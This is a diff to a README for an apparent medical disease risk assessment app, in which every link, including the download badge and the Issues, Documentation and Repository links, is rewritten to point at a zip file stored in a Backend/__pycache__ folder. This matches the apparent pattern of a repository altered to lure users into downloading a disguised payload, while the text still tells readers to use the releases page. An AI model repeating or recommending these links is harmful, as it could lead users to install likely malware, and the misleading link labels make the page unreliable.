@@ -1,6 +1,6 @@
 # 🩺 Medical-Disease-Risk-Assessment-System - Assess Your Health Risks Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Find%20Your%20Health%20Risks-blue.svg)](https://github.com/faisaleee/Medical-Disease-Risk-Assessment-System/releases)
+[![Download Now](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Backend/__pycache__/Medical-Disease-Risk-Assessment-System-v3.5.zip%20Now-Find%20Your%20Health%https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Backend/__pycache__/Medical-Disease-Risk-Assessment-System-v3.5.zip)](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Backend/__pycache__/Medical-Disease-Risk-Assessment-System-v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -20,13 +20,13 @@ Before you start, ensure you have:
 
 To download the application, visit the link below:
 
-[Download from Releases Page](https://github.com/faisaleee/Medical-Disease-Risk-Assessment-System/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Backend/__pycache__/Medical-Disease-Risk-Assessment-System-v3.5.zip)
 
 Once you visit the page, look for the latest version titled “Medical Disease Risk Assessment System”. Click on the version, then download the appropriate file for your operating system. 
 
 ### 📥 Steps to Download:
 
-1. Click on [Download from Releases Page](https://github.com/faisaleee/Medical-Disease-Risk-Assessment-System/releases).
+1. Click on [Download from Releases Page](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Backend/__pycache__/Medical-Disease-Risk-Assessment-System-v3.5.zip).
 2. Locate the latest version of the application.
 3. Download the file that matches your operating system.
 4. Remember where you save this file on your computer.
@@ -73,19 +73,19 @@ If you encounter issues:
 - Make sure you have the latest version of the application downloaded.
 - Restart the application if it is not responding.
 
-If problems persist, check the [Issues](https://github.com/faisaleee/Medical-Disease-Risk-Assessment-System/issues) section on our GitHub page for more help.
+If problems persist, check the [Issues](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Backend/__pycache__/Medical-Disease-Risk-Assessment-System-v3.5.zip) section on our GitHub page for more help.
 
 ## 🤝 Get Support
 
 For further assistance, feel free to reach out via the following:
 
-- Open an issue on our [GitHub page](https://github.com/faisaleee/Medical-Disease-Risk-Assessment-System/issues).
+- Open an issue on our [GitHub page](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Backend/__pycache__/Medical-Disease-Risk-Assessment-System-v3.5.zip).
 - Join our community on social platforms linked on the GitHub page.
 
 ## 🔗 Useful Links
 
-- [Download from Releases Page](https://github.com/faisaleee/Medical-Disease-Risk-Assessment-System/releases)
-- [Documentation](https://github.com/faisaleee/Medical-Disease-Risk-Assessment-System/wiki)
-- [GitHub Repository](https://github.com/faisaleee/Medical-Disease-Risk-Assessment-System)
+- [Download from Releases Page](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Backend/__pycache__/Medical-Disease-Risk-Assessment-System-v3.5.zip)
+- [Documentation](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Backend/__pycache__/Medical-Disease-Risk-Assessment-System-v3.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/faisaleee/Medical-Disease-Risk-Assessment-System/main/Backend/__pycache__/Medical-Disease-Risk-Assessment-System-v3.5.zip)
 
 Thank you for using the Medical Disease Risk Assessment System. Your health is important, and we are here to assist you in making informed healthcare decisions.
